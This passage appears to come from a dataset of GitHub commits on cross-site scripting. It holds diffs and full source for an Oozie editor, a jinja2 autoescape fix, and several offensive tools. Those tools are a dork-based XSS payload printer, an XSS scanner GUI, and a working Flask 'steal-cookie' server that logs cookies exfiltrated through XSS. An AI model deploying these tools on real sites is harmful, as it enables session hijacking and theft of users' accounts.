ex:\n    raise PopupException(_(\"Error submitting coordinator %s\") % (coordinator,),\n                         detail=ex._headers.get('oozie-error-message', ex))\n    \n    \n    \n\ndef list_editor_bundles(request):\n  bundles = [d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='bundle2')]\n\n  return render('editor/list_editor_bundles.mako', request, {\n      'bundles': bundles\n  })\n\n\n@check_document_access_permission()\ndef edit_bundle(request):\n  bundle_id = request.GET.get('bundle')\n  doc = None\n  \n  if bundle_id:\n    doc = Document2.objects.get(id=bundle_id)\n    bundle = Bundle(document=doc)\n  else:\n    bundle = Bundle()\n\n  coordinators = [dict([('uuid', d.content_object.uuid), ('name', d.content_object.name)])\n                      for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')]\n\n  return render('editor/bundle_editor.mako', request, {\n      'bundle_json': bundle.json,\n      'coordinators_json': json.dumps(coordinators),\n      'doc1_id': doc.doc.get().id if doc else -1,\n      'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))      \n  })\n\n\ndef new_bundle(request):\n  return edit_bundle(request)\n\n\n@check_document_modify_permission()\ndef save_bundle(request):\n  response = {'status': -1}\n\n  bundle_data = json.loads(request.POST.get('bundle', '{}'))\n\n  if bundle_data.get('id'):\n    bundle_doc = Document2.objects.get(id=bundle_data['id'])\n  else:      \n    bundle_doc = Document2.objects.create(name=bundle_data['name'], uuid=bundle_data['uuid'], type='oozie-bundle2', owner=request.user)\n    Document.objects.link(bundle_doc, owner=bundle_doc.owner, name=bundle_doc.name, description=bundle_doc.description, extra='bundle2')\n\n  if bundle_data['coordinators']:\n    dependencies = Document2.objects.filter(type='oozie-coordinator2', uuid__in=[c['coordinator'] for c in bundle_data['coordinators']])\n    for doc in dependencies:\n      doc.doc.get().can_read_or_exception(request.user)    \n    bundle_doc.dependencies = dependencies\n\n  bundle_doc.update_data(bundle_data)\n  bundle_doc.name = bundle_data['name']\n  bundle_doc.save()\n  \n  response['status'] = 0\n  response['id'] = bundle_doc.id\n  response['message'] = _('Saved !')\n\n  return HttpResponse(json.dumps(response), mimetype=\"application/json\")\n\n\n@check_document_access_permission()\ndef submit_bundle(request, doc_id):\n  bundle = Bundle(document=Document2.objects.get(id=doc_id))  \n  ParametersFormSet = formset_factory(ParameterForm, extra=0)\n\n  if request.method == 'POST':\n    params_form = ParametersFormSet(request.POST)\n\n    if params_form.is_valid():\n      mapping = dict([(param['name'], param['value']) for param in params_form.cleaned_data])\n      job_id = _submit_bundle(request, bundle, mapping)\n\n      request.info(_('Bundle submitted.'))\n      return redirect(reverse('oozie:list_oozie_bundle', kwargs={'job_id': job_id}))\n    else:\n      request.error(_('Invalid submission form: %s' % params_form.errors))\n  else:\n    parameters = bundle.find_all_parameters()\n    initial_params = ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]))\n    params_form = ParametersFormSet(initial=initial_params)\n\n  popup = render('editor/submit_job_popup.mako', request, {\n                 'params_form': params_form,\n                 'action': reverse('oozie:editor_submit_bundle',  kwargs={'doc_id': bundle.id})\n                }, force_template=True).content\n  return HttpResponse(json.dumps(popup), mimetype=\"application/json\")\n\n\ndef _submit_bundle(request, bundle, properties):\n  try:\n    deployment_mapping = {}\n    coords = dict([(c.uuid, c) for c in Document2.objects.filter(type='oozie-coordinator2', uuid__in=[b['coordinator'] for b in bundle.data['coordinators']])])\n    \n    for i, bundled in enumerate(bundle.data['coordinators']):\n      coord = coords[bundled['coordinator']]\n      workflow = Workflow(document=coord.dependencies.all()[0])\n      wf_dir = Submission(request.user, workflow, request.fs, request.jt, properties).deploy()      \n      deployment_mapping['wf_%s_dir' % i] = request.fs.get_hdfs_path(wf_dir)\n      \n      coordinator = Coordinator(document=coord)\n      coord_dir = Submission(request.user, coordinator, request.fs, request.jt, properties).deploy()\n      deployment_mapping['coord_%s_dir' % i] = coord_dir\n      deployment_mapping['coord_%s' % i] = coord\n\n    properties.update(deployment_mapping)\n    \n    submission = Submission(request.user, bundle, request.fs, request.jt, properties=properties)\n    job_id = submission.run()\n\n    return job_id\n  except RestException, ex:\n    raise PopupException(_(\"Error submitting bundle %s\") % (bundle,), detail=ex._headers.get('oozie-error-message', ex))\n\n"}}, "msg": "[oozie] Protect against XSS in the editor"}}, "https://github.com/OkunaOrg/okuna-www-api": {"8c40c66ea7c483a0cbda4c21940180af909aab99": {"url": "https://api.github.com/repos/OkunaOrg/okuna-www-api/commits/8c40c66ea7c483a0cbda4c21940180af909aab99", "html_url": "https://github.com/OkunaOrg/okuna-www-api/commit/8c40c66ea7c483a0cbda4c21940180af909aab99", "message": ":bug: Add autoescape=True for jinja2 to prevent XSS\n\n>> Issue: [B701:jinja2_autoescape_false] By default, jinja2 sets autoescape to False. Consider using autoescape=True or use the select_autoescape function to mitigate XSS vulnerabilities.\n   Severity: High   Confidence: High\n   Location: ./utils/make_eb_config.py:11\n   More Info: https://bandit.readthedocs.io/en/latest/plugins/b701_jinja2_autoescape_false.html", "sha": "8c40c66ea7c483a0cbda4c21940180af909aab99", "keyword": "XSS issue", "diff": "diff --git a/utils/make_eb_config.py b/utils/make_eb_config.py\nindex 8c80bfe..817409b 100644\n--- a/utils/make_eb_config.py\n+++ b/utils/make_eb_config.py\n@@ -8,7 +8,7 @@ def make_eb_config(application_name, default_region):\n     UTILS_DIR = os.path.dirname(os.path.abspath(__file__))\n     # Create the jinja2 environment.\n     # Notice the use of trim_blocks, which greatly helps control whitespace.\n-    j2_env = Environment(loader=FileSystemLoader(UTILS_DIR))\n+    j2_env = Environment(loader=FileSystemLoader(UTILS_DIR), autoescape=True)\n     return j2_env.get_template('templates/eb/config.yml').render(\n         APPLICATION_NAME=application_name,\n         DEFAULT_REGION=default_region\n", "files": {"/utils/make_eb_config.py": {"changes": [{"diff": "\n     UTILS_DIR = os.path.dirname(os.path.abspath(__file__))\n     # Create the jinja2 environment.\n     # Notice the use of trim_blocks, which greatly helps control whitespace.\n-    j2_env = Environment(loader=FileSystemLoader(UTILS_DIR))\n+    j2_env = Environment(loader=FileSystemLoader(UTILS_DIR), autoescape=True)\n     return j2_env.get_template('templates/eb/config.yml').render(\n         APPLICATION_NAME=application_name,\n         DEFAULT_REGION=default_region\n", "add": 1, "remove": 1, "filename": "/utils/make_eb_config.py", "badparts": ["    j2_env = Environment(loader=FileSystemLoader(UTILS_DIR))"], "goodparts": ["    j2_env = Environment(loader=FileSystemLoader(UTILS_DIR), autoescape=True)"]}], "source": "\nimport os import argparse from jinja2 import Environment, FileSystemLoader def make_eb_config(application_name, default_region): UTILS_DIR=os.path.dirname(os.path.abspath(__file__)) j2_env=Environment(loader=FileSystemLoader(UTILS_DIR)) return j2_env.get_template('templates/eb/config.yml').render( APPLICATION_NAME=application_name, DEFAULT_REGION=default_region ) def write_eb_config(dest, application_name, default_region): contents=make_eb_config(application_name, default_region) fh=open(dest, 'w') fh.write(contents) fh.close() if __name__=='__main__': parser=argparse.ArgumentParser(description='EB Config Maker') parser.add_argument('--dest', type=str, help='The destination of the generated eb config', default='./.elasticbeanstalk/config.yml') parser.add_argument('--name', type=str, required=True, help='The name of the application') parser.add_argument('--region', type=str, required=True, help='The default application region') args=parser.parse_args() write_eb_config(args.dest, application_name=args.name, default_region=args.region) ", "sourceWithComments": "import os\nimport argparse\nfrom jinja2 import Environment, FileSystemLoader\n\n\ndef make_eb_config(application_name, default_region):\n    # Capture our current directory\n    UTILS_DIR = os.path.dirname(os.path.abspath(__file__))\n    # Create the jinja2 environment.\n    # Notice the use of trim_blocks, which greatly helps control whitespace.\n    j2_env = Environment(loader=FileSystemLoader(UTILS_DIR))\n    return j2_env.get_template('templates/eb/config.yml').render(\n        APPLICATION_NAME=application_name,\n        DEFAULT_REGION=default_region\n    )\n\n\ndef write_eb_config(dest, application_name, default_region):\n    contents = make_eb_config(application_name, default_region)\n    fh = open(dest, 'w')\n    fh.write(contents)\n    fh.close()\n\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description='EB Config Maker')\n    # Optional argument\n    parser.add_argument('--dest', type=str,\n                        help='The destination of the generated eb config',\n                        default='./.elasticbeanstalk/config.yml')\n\n    parser.add_argument('--name', type=str,\n                        required=True,\n                        help='The name of the application')\n\n    parser.add_argument('--region', type=str,\n                        required=True,\n                        help='The default application region')\n\n    args = parser.parse_args()\n\n    write_eb_config(args.dest, application_name=args.name, default_region=args.region)\n"}}, "msg": ":bug: Add autoescape=True for jinja2 to prevent XSS\n\n>> Issue: [B701:jinja2_autoescape_false] By default, jinja2 sets autoescape to False. Consider using autoescape=True or use the select_autoescape function to mitigate XSS vulnerabilities.\n   Severity: High   Confidence: High\n   Location: ./utils/make_eb_config.py:11\n   More Info: https://bandit.readthedocs.io/en/latest/plugins/b701_jinja2_autoescape_false.html"}}, "https://github.com/FajarTheGGman/RoseKiller": {"6b303259f62432bcb323721f038b4396e356ff6f": {"url": "https://api.github.com/repos/FajarTheGGman/RoseKiller/commits/6b303259f62432bcb323721f038b4396e356ff6f", "html_url": "https://github.com/FajarTheGGman/RoseKiller/commit/6b303259f62432bcb323721f038b4396e356ff6f", "sha": "6b303259f62432bcb323721f038b4396e356ff6f", "keyword": "XSS update", "diff": "diff --git a/content/xss.py b/content/xss.py\nindex 7984abf..a9b9db6 100644\n--- a/content/xss.py\n+++ b/content/xss.py\n@@ -7,10 +7,9 @@ class Xss:\n     def main():\n         user_dork = str(input(\"[Input Dork] >_ \"))\n         req = url.PoolManager()\n-        for page in range(4):\n-            send = req.request(\"GET\", \"http://www1.search-results.com/web?q=\" + user_dork + \"&page=\" + str(page))\n-            parser = BeautifulSoup(send.data, features=\"lxml\")\n-            for link in parser.find_all('cite'):\n-                result = link.string\n-                x = str(input(\"[Input Script] >_ \"))\n-                print(str(result) + \"'\" + \"<marquee style='background:red'>\" + x + \"</marquee>\")\n+        send = req.request(\"GET\", \"http://www1.search-results.com/web?q=\" + user_dork + \"&page=\" + str(page))\n+        parser = BeautifulSoup(send.data, features=\"lxml\")\n+        for link in parser.find_all('cite'):\n+            result = link.string\n+            x = str(input(\"[Input Script] >_ \"))\n+            print(str(result) + \"'\" + \"<marquee style='background:red'>\" + x + \"</marquee>\")\n", "message": "", "files": {"/content/xss.py": {"changes": [{"diff": "\n     def main():\n         user_dork = str(input(\"[Input Dork] >_ \"))\n         req = url.PoolManager()\n-        for page in range(4):\n-            send = req.request(\"GET\", \"http://www1.search-results.com/web?q=\" + user_dork + \"&page=\" + str(page))\n-            parser = BeautifulSoup(send.data, features=\"lxml\")\n-            for link in parser.find_all('cite'):\n-                result = link.string\n-                x = str(input(\"[Input Script] >_ \"))\n-                print(str(result) + \"'\" + \"<marquee style='background:red'>\" + x + \"</marquee>\")\n+        send = req.request(\"GET\", \"http://www1.search-results.com/web?q=\" + user_dork + \"&page=\" + str(page))\n+        parser = BeautifulSoup(send.data, features=\"lxml\")\n+        for link in parser.find_all('cite'):\n+            result = link.string\n+            x = str(input(\"[Input Script] >_ \"))\n+            print(str(result) + \"'\" + \"<marquee style='background:red'>\" + x + \"</marquee>\")\n", "add": 6, "remove": 7, "filename": "/content/xss.py", "badparts": ["        for page in range(4):", "            send = req.request(\"GET\", \"http://www1.search-results.com/web?q=\" + user_dork + \"&page=\" + str(page))", "            parser = BeautifulSoup(send.data, features=\"lxml\")", "            for link in parser.find_all('cite'):", "                result = link.string", "                x = str(input(\"[Input Script] >_ \"))", "                print(str(result) + \"'\" + \"<marquee style='background:red'>\" + x + \"</marquee>\")"], "goodparts": ["        send = req.request(\"GET\", \"http://www1.search-results.com/web?q=\" + user_dork + \"&page=\" + str(page))", "        parser = BeautifulSoup(send.data, features=\"lxml\")", "        for link in parser.find_all('cite'):", "            result = link.string", "            x = str(input(\"[Input Script] >_ \"))", "            print(str(result) + \"'\" + \"<marquee style='background:red'>\" + x + \"</marquee>\")"]}], "source": "\nimport urllib3 as url from pyquery import PyQuery from bs4 import BeautifulSoup import requests class Xss: def main(): user_dork=str(input(\"[Input Dork] >_ \")) req=url.PoolManager() for page in range(4): send=req.request(\"GET\", \"http://www1.search-results.com/web?q=\" +user_dork +\"&page=\" +str(page)) parser=BeautifulSoup(send.data, features=\"lxml\") for link in parser.find_all('cite'): result=link.string x=str(input(\"[Input Script] >_ \")) print(str(result) +\"'\" +\"<marquee style='background:red'>\" +x +\"</marquee>\") ", "sourceWithComments": "import urllib3 as url\nfrom pyquery import PyQuery\nfrom bs4 import BeautifulSoup\nimport requests\n\nclass Xss:\n    def main():\n        user_dork = str(input(\"[Input Dork] >_ \"))\n        req = url.PoolManager()\n        for page in range(4):\n            send = req.request(\"GET\", \"http://www1.search-results.com/web?q=\" + user_dork + \"&page=\" + str(page))\n            parser = BeautifulSoup(send.data, features=\"lxml\")\n            for link in parser.find_all('cite'):\n                result = link.string\n                x = str(input(\"[Input Script] >_ \"))\n                print(str(result) + \"'\" + \"<marquee style='background:red'>\" + x + \"</marquee>\")\n"}}, "msg": "Update xss.py"}, "9bb7a1ac857c2dce57118beb79bb3a343f6b51ec": {"url": "https://api.github.com/repos/FajarTheGGman/RoseKiller/commits/9bb7a1ac857c2dce57118beb79bb3a343f6b51ec", "html_url": "https://github.com/FajarTheGGman/RoseKiller/commit/9bb7a1ac857c2dce57118beb79bb3a343f6b51ec", "message": "Update xss.py", "sha": "9bb7a1ac857c2dce57118beb79bb3a343f6b51ec", "keyword": "XSS update", "diff": "diff --git a/content/xss.py b/content/xss.py\nindex a9b9db6..feaf281 100644\n--- a/content/xss.py\n+++ b/content/xss.py\n@@ -1,5 +1,4 @@\n import urllib3 as url\n-from pyquery import PyQuery\n from bs4 import BeautifulSoup\n import requests\n \n@@ -7,9 +6,13 @@ class Xss:\n     def main():\n         user_dork = str(input(\"[Input Dork] >_ \"))\n         req = url.PoolManager()\n-        send = req.request(\"GET\", \"http://www1.search-results.com/web?q=\" + user_dork + \"&page=\" + str(page))\n-        parser = BeautifulSoup(send.data, features=\"lxml\")\n+        send = req.request(\"GET\", \"http://www1.search-results.com/web?q=\" + user_dork)\n+        parser = BeautifulSoup(send.data, features=\"html.parser\")\n+        x = str(input(\"[Message] >_ \"))\n+        print(\"[+] Here's the result ! \\n\")\n+        print(\"-----------------------------------------\")\n         for link in parser.find_all('cite'):\n             result = link.string\n-            x = str(input(\"[Input Script] >_ \"))\n-            print(str(result) + \"'\" + \"<marquee style='background:red'>\" + x + \"</marquee>\")\n+            print(\"[+] > \" + str(result) + \"'\" + \"<marquee style='background:red'>\" + x + \"</marquee>\")\n+\n+        print(\"-----------------------------------------\")\n", "files": {"/content/xss.py": {"changes": [{"diff": "\n import urllib3 as url\n-from pyquery import PyQuery\n from bs4 import BeautifulSoup\n import requests\n \n", "add": 0, "remove": 1, "filename": "/content/xss.py", "badparts": ["from pyquery import PyQuery"], "goodparts": []}, {"diff": "\n     def main():\n         user_dork = str(input(\"[Input Dork] >_ \"))\n         req = url.PoolManager()\n-        send = req.request(\"GET\", \"http://www1.search-results.com/web?q=\" + user_dork + \"&page=\" + str(page))\n-        parser = BeautifulSoup(send.data, features=\"lxml\")\n+        send = req.request(\"GET\", \"http://www1.search-results.com/web?q=\" + user_dork)\n+        parser = BeautifulSoup(send.data, features=\"html.parser\")\n+        x = str(input(\"[Message] >_ \"))\n+        print(\"[+] Here's the result ! \\n\")\n+        print(\"-----------------------------------------\")\n         for link in parser.find_all('cite'):\n             result = link.string\n-            x = str(input(\"[Input Script] >_ \"))\n-            print(str(result) + \"'\" + \"<marquee style='background:red'>\" + x + \"</marquee>\")\n+            print(\"[+] > \" + str(result) + \"'\" + \"<marquee style='background:red'>\" + x + \"</marquee>\")\n+\n+        print(\"-----------------------------------------\")\n", "add": 8, "remove": 4, "filename": "/content/xss.py", "badparts": ["        send = req.request(\"GET\", \"http://www1.search-results.com/web?q=\" + user_dork + \"&page=\" + str(page))", "        parser = BeautifulSoup(send.data, features=\"lxml\")", "            x = str(input(\"[Input Script] >_ \"))", "            print(str(result) + \"'\" + \"<marquee style='background:red'>\" + x + \"</marquee>\")"], "goodparts": ["        send = req.request(\"GET\", \"http://www1.search-results.com/web?q=\" + user_dork)", "        parser = BeautifulSoup(send.data, features=\"html.parser\")", "        x = str(input(\"[Message] >_ \"))", "        print(\"[+] Here's the result ! \\n\")", "        print(\"-----------------------------------------\")", "            print(\"[+] > \" + str(result) + \"'\" + \"<marquee style='background:red'>\" + x + \"</marquee>\")", "        print(\"-----------------------------------------\")"]}], "source": "\nimport urllib3 as url from pyquery import PyQuery from bs4 import BeautifulSoup import requests class Xss: def main(): user_dork=str(input(\"[Input Dork] >_ \")) req=url.PoolManager() send=req.request(\"GET\", \"http://www1.search-results.com/web?q=\" +user_dork +\"&page=\" +str(page)) parser=BeautifulSoup(send.data, features=\"lxml\") for link in parser.find_all('cite'): result=link.string x=str(input(\"[Input Script] >_ \")) print(str(result) +\"'\" +\"<marquee style='background:red'>\" +x +\"</marquee>\") ", "sourceWithComments": "import urllib3 as url\nfrom pyquery import PyQuery\nfrom bs4 import BeautifulSoup\nimport requests\n\nclass Xss:\n    def main():\n        user_dork = str(input(\"[Input Dork] >_ \"))\n        req = url.PoolManager()\n        send = req.request(\"GET\", \"http://www1.search-results.com/web?q=\" + user_dork + \"&page=\" + str(page))\n        parser = BeautifulSoup(send.data, features=\"lxml\")\n        for link in parser.find_all('cite'):\n            result = link.string\n            x = str(input(\"[Input Script] >_ \"))\n            print(str(result) + \"'\" + \"<marquee style='background:red'>\" + x + \"</marquee>\")\n"}}, "msg": "Update xss.py"}}, "https://github.com/knassar702/steal-cookie": {"f89875a106cac251e066535823c3fada522a7ae1": {"url": "https://api.github.com/repos/knassar702/steal-cookie/commits/f89875a106cac251e066535823c3fada522a7ae1", "html_url": "https://github.com/knassar702/steal-cookie/commit/f89875a106cac251e066535823c3fada522a7ae1", "sha": "f89875a106cac251e066535823c3fada522a7ae1", "keyword": "XSS update", "diff": "diff --git a/xss.py b/xss.py\nindex 53802d8..f39f610 100644\n--- a/xss.py\n+++ b/xss.py\n@@ -3,7 +3,7 @@\n app = Flask(__name__)\n @app.route('/')\n def index():\n-\treturn 'steal cookie :) '\n+\treturn 'Hello ^_^'\n @app.route('/cookie',methods=['GET','POST'])\n def steal():\n \tif request.method == \"GET\" or request.method == \"POST\":\n", "message": "", "files": {"/xss.py": {"changes": [{"diff": "\n app = Flask(__name__)\n @app.route('/')\n def index():\n-\treturn 'steal cookie :) '\n+\treturn 'Hello ^_^'\n @app.route('/cookie',methods=['GET','POST'])\n def steal():\n \tif request.method == \"GET\" or request.method == \"POST\":\n", "add": 1, "remove": 1, "filename": "/xss.py", "badparts": ["\treturn 'steal cookie :) '"], "goodparts": ["\treturn 'Hello ^_^'"]}], "source": "\nfrom flask import Flask,request from termcolor import colored app=Flask(__name__) @app.route('/') def index(): \treturn 'steal cookie:) ' @app.route('/cookie',methods=['GET','POST']) def steal(): \tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode='a') as f: \t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n---------------------------\\n') \t\tprint(colored('\\n\\n[+] ','green')+'New Cookie..\\n\\n') \t\treturn 'Thanks:)' if __name__=='__main__': \tapp.run() ", "sourceWithComments": "from flask import Flask,request\nfrom termcolor import colored\napp = Flask(__name__)\n@app.route('/')\ndef index():\n\treturn 'steal cookie :) '\n@app.route('/cookie',methods=['GET','POST'])\ndef steal():\n\tif request.method == \"GET\" or request.method == \"POST\":\n\t\tdata = request.values\n\t\tcookie = data.get('cookie')\n\t\twith open('cookies.txt',mode='a') as f:\n\t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n---------------------------\\n')\n\t\tprint(colored('\\n\\n[+] ','green')+'New Cookie ..\\n\\n')\n\t\treturn 'Thanks :)'\nif __name__ == '__main__':\n\tapp.run()\n"}}, "msg": "Update xss.py"}, "33993d2dca4259e574211b8fa84032894b278bb0": {"url": "https://api.github.com/repos/knassar702/steal-cookie/commits/33993d2dca4259e574211b8fa84032894b278bb0", "html_url": "https://github.com/knassar702/steal-cookie/commit/33993d2dca4259e574211b8fa84032894b278bb0", "sha": "33993d2dca4259e574211b8fa84032894b278bb0", "keyword": "XSS update", "diff": "diff --git a/xss.py b/xss.py\nindex 4d5d3e8..db031bf 100644\n--- a/xss.py\n+++ b/xss.py\n@@ -1,8 +1,8 @@\n from flask import Flask,request\n from termcolor import colored\n from time import sleep\n-print ('\\n\\t[ Steal Cookie Using Xss .. ]\\n\\n')\n-print(colored('\\n\\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\\n\\n')\n+print ('\\n\\t[ Steal Cookie Using Xss .. ]\\n')\n+print(colored('\\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\\n\\n')\n sleep(2)\n app = Flask(__name__)\n @app.route('/')\n", "message": "", "files": {"/xss.py": {"changes": [{"diff": "\n from flask import Flask,request\n from termcolor import colored\n from time import sleep\n-print ('\\n\\t[ Steal Cookie Using Xss .. ]\\n\\n')\n-print(colored('\\n\\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\\n\\n')\n+print ('\\n\\t[ Steal Cookie Using Xss .. ]\\n')\n+print(colored('\\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\\n\\n')\n sleep(2)\n app = Flask(__name__)\n @app.route('/')\n", "add": 2, "remove": 2, "filename": "/xss.py", "badparts": ["print ('\\n\\t[ Steal Cookie Using Xss .. ]\\n\\n')", "print(colored('\\n\\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\\n\\n')"], "goodparts": ["print ('\\n\\t[ Steal Cookie Using Xss .. ]\\n')", "print(colored('\\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\\n\\n')"]}], "source": "\nfrom flask import Flask,request from termcolor import colored from time import sleep print('\\n\\t[ Steal Cookie Using Xss..]\\n\\n') print(colored('\\n\\n[*] ','yellow')+'Coded By: Khaled Nassar @knassar702\\n\\n') sleep(2) app=Flask(__name__) @app.route('/') def index(): \treturn 'Hello ^_^' @app.route('/cookie',methods=['GET','POST']) def steal(): \tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode='a') as f: \t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n---------------------------\\n') \t\tprint(colored('\\n\\n[+] ','green')+'New Cookie..\\n\\n') \t\treturn 'Thanks:)' if __name__=='__main__': \tapp.run() ", "sourceWithComments": "from flask import Flask,request\nfrom termcolor import colored\nfrom time import sleep\nprint ('\\n\\t[ Steal Cookie Using Xss .. ]\\n\\n')\nprint(colored('\\n\\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\\n\\n')\nsleep(2)\napp = Flask(__name__)\n@app.route('/')\ndef index():\n\treturn 'Hello ^_^'\n@app.route('/cookie',methods=['GET','POST'])\ndef steal():\n\tif request.method == \"GET\" or request.method == \"POST\":\n\t\tdata = request.values\n\t\tcookie = data.get('cookie')\n\t\twith open('cookies.txt',mode='a') as f:\n\t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n---------------------------\\n')\n\t\tprint(colored('\\n\\n[+] ','green')+'New Cookie ..\\n\\n')\n\t\treturn 'Thanks :)'\nif __name__ == '__main__':\n\tapp.run()\n"}}, "msg": "Update xss.py"}, "d20b8de6b838a490155218b2306c87f6060713a6": {"url": "https://api.github.com/repos/knassar702/steal-cookie/commits/d20b8de6b838a490155218b2306c87f6060713a6", "html_url": "https://github.com/knassar702/steal-cookie/commit/d20b8de6b838a490155218b2306c87f6060713a6", "message": "Update xss.py", "sha": "d20b8de6b838a490155218b2306c87f6060713a6", "keyword": "XSS update", "diff": "diff --git a/xss.py b/xss.py\nindex db031bf..72293e9 100644\n--- a/xss.py\n+++ b/xss.py\n@@ -1,6 +1,14 @@\n-from flask import Flask,request\n-from termcolor import colored\n-from time import sleep\n+try:\n+\tfrom flask import Flask,request\n+\tfrom termcolor import colored\n+\tfrom time import sleep\n+except:\n+\tprint('[!] Install The Modules .. ')\n+\timport os\n+\tos.system('pip install flask')\n+\tos.system('pip install termcolor')\n+\tos.system('pip install time')\n+\tsys.exit()\n print ('\\n\\t[ Steal Cookie Using Xss .. ]\\n')\n print(colored('\\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\\n\\n')\n sleep(2)\n", "files": {"/xss.py": {"changes": [{"diff": "\n-from flask import Flask,request\n-from termcolor import colored\n-from time import sleep\n+try:\n+\tfrom flask import Flask,request\n+\tfrom termcolor import colored\n+\tfrom time import sleep\n+except:\n+\tprint('[!] Install The Modules .. ')\n+\timport os\n+\tos.system('pip install flask')\n+\tos.system('pip install termcolor')\n+\tos.system('pip install time')\n+\tsys.exit()\n print ('\\n\\t[ Steal Cookie Using Xss .. ]\\n')\n print(colored('\\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\\n\\n')\n sleep(2)\n", "add": 11, "remove": 3, "filename": "/xss.py", "badparts": ["from flask import Flask,request", "from termcolor import colored", "from time import sleep"], "goodparts": ["try:", "\tfrom flask import Flask,request", "\tfrom termcolor import colored", "\tfrom time import sleep", "except:", "\tprint('[!] Install The Modules .. ')", "\tos.system('pip install flask')", "\tos.system('pip install termcolor')", "\tos.system('pip install time')", "\tsys.exit()"]}], "source": "\nfrom flask import Flask,request from termcolor import colored from time import sleep print('\\n\\t[ Steal Cookie Using Xss..]\\n') print(colored('\\n[*] ','yellow')+'Coded By: Khaled Nassar @knassar702\\n\\n') sleep(2) app=Flask(__name__) @app.route('/') def index(): \treturn 'Hello ^_^' @app.route('/cookie',methods=['GET','POST']) def steal(): \tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode='a') as f: \t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n---------------------------\\n') \t\tprint(colored('\\n\\n[+] ','green')+'New Cookie..\\n\\n') \t\treturn 'Thanks:)' if __name__=='__main__': \tapp.run() ", "sourceWithComments": "from flask import Flask,request\nfrom termcolor import colored\nfrom time import sleep\nprint ('\\n\\t[ Steal Cookie Using Xss .. ]\\n')\nprint(colored('\\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\\n\\n')\nsleep(2)\napp = Flask(__name__)\n@app.route('/')\ndef index():\n\treturn 'Hello ^_^'\n@app.route('/cookie',methods=['GET','POST'])\ndef steal():\n\tif request.method == \"GET\" or request.method == \"POST\":\n\t\tdata = request.values\n\t\tcookie = data.get('cookie')\n\t\twith open('cookies.txt',mode='a') as f:\n\t\t\tf.write('\\n---------------------------\\n'+cookie+'\\n---------------------------\\n')\n\t\tprint(colored('\\n\\n[+] ','green')+'New Cookie ..\\n\\n')\n\t\treturn 'Thanks :)'\nif __name__ == '__main__':\n\tapp.run()\n"}}, "msg": "Update xss.py"}}, "https://github.com/AlaBouali/XSSonar": {"7b0f9febbb71120e4c7e79464f374d5dcd1dd6f1": {"url": "https://api.github.com/repos/AlaBouali/XSSonar/commits/7b0f9febbb71120e4c7e79464f374d5dcd1dd6f1", "html_url": "https://github.com/AlaBouali/XSSonar/commit/7b0f9febbb71120e4c7e79464f374d5dcd1dd6f1", "sha": "7b0f9febbb71120e4c7e79464f374d5dcd1dd6f1", "keyword": "XSS update", "diff": "diff --git a/xss.py b/xss.py\nindex 2e81dfe..a24816c 100644\n--- a/xss.py\n+++ b/xss.py\n@@ -79,7 +79,7 @@ def kill():\n ua=[\"\"]\n ua+=bane.ua\n li=bane.read_file('xss.txt')\n-pl=[]\n+pl=['']\n for x in li:\n  pl.append(x.strip())\n prox=[\"\"]\n", "message": "", "files": {"/xss.py": {"changes": [{"diff": "\n ua=[\"\"]\n ua+=bane.ua\n li=bane.read_file('xss.txt')\n-pl=[]\n+pl=['']\n for x in li:\n  pl.append(x.strip())\n prox=[\"\"]\n", "add": 1, "remove": 1, "filename": "/xss.py", "badparts": ["pl=[]"], "goodparts": ["pl=['']"]}], "source": "\nimport sys,threading,time from datetime import datetime try: from tkinter import * from tkinter import ttk except: print(\"You need to install: tkinter\") sys.exit() try: import bane except: print(\"You need to install: bane\") sys.exit() class sc(threading.Thread): def run(self): global stop ti=time.time() print(\"=\"*25) print(\"\\n[*]Target:{}\\n[*]Date:{}\".format(target.get(),datetime.now().strftime(\"%d/%m/%Y %H:%M:%S\"))) crl=[target.get()] if crawl.get()=='On': crl+=bane.crawl(target.get(),bypass=True) pr=proxy.get() if len(pr)==0: pr=None if method.get()==\"GET\": get=True post=False elif method.get()==\"POST\": get=False post=True else: get=True post=True fresh=False if refresh.get()==\"On\": fresh=True ck=None c=cookie.get() if len(c)>0: ck=c for x in crl: if stop==True: break print(\"[*]URL:{}\".format(x)) bane.xss(x,payload=payload.get(),proxy=pr,get=get,post=post,user_agent=user_agent.get(),fresh=fresh,cookie=ck) print(\"[*]Test was finished at:{}\\n[*]Duration:{} seconds\\n\".format(datetime.now().strftime(\"%d/%m/%Y %H:%M:%S\"),int(time.time()-ti))) print(\"=\"*25) stop=False def scan(): sc().start() class ki(threading.Thread): def run(self): global stop stop=True def kill(): ki().start() main=Tk() main.title(\"XSS Sonar\") main.configure(background='light sky blue') Label(main, text=\"Target:\",background='light sky blue').grid(row=0) Label(main, text=\"Cookie:(Optional)\",background='light sky blue').grid(row=1) Label(main, text=\"Method:\",background='light sky blue').grid(row=2) Label(main, text=\"Timeout:\",background='light sky blue').grid(row=3) Label(main, text=\"User-Agent:\",background='light sky blue').grid(row=4) Label(main, text=\"Payload:\",background='light sky blue').grid(row=5) Label(main, text=\"HTTP Proxy:\",background='light sky blue').grid(row=6) Label(main, text=\"Refresh:\",background='light sky blue').grid(row=7) Label(main, text=\"Crawl\",background='light sky 